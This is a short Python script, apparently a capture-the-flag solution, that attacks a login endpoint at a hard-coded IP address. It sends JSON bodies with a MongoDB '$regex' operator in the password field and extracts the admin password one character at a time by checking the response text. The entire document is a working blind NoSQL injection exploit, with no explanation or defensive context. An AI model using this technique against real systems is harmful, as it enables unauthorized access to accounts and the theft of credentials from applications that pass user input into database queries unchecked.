import requests
import time
import json
import re
from urllib.parse import quote

dicts = '0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'

flag = ''

while True:
    for s in dicts:
        print('testing', s)
        url = 'http://139.196.153.118:32087/user/LoginIndex'
        res = requests.post(url,data=json.dumps({'username': 'admin', 'password': {'$regex': '^' + flag + s}}), headers={'Content-Type': 'application/json'})
        if 'Hacker' in res.text:
            print('error')
            quit()
        if 'invalid' not in res.text:
            flag += s
            print('found!!!', flag)
            break